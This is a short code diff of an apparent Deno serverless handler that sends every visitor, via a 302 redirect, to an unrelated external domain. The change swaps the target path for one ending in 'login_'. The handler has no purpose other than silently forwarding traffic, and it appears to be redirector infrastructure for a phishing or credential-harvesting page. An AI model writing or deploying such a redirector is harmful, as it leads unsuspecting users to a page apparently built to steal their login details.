@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://acesdeaocliconline.info/burke/herbert/",
+      Location: "https://acesdeaocliconline.info/westreet/login_/",
     },
   });
 });
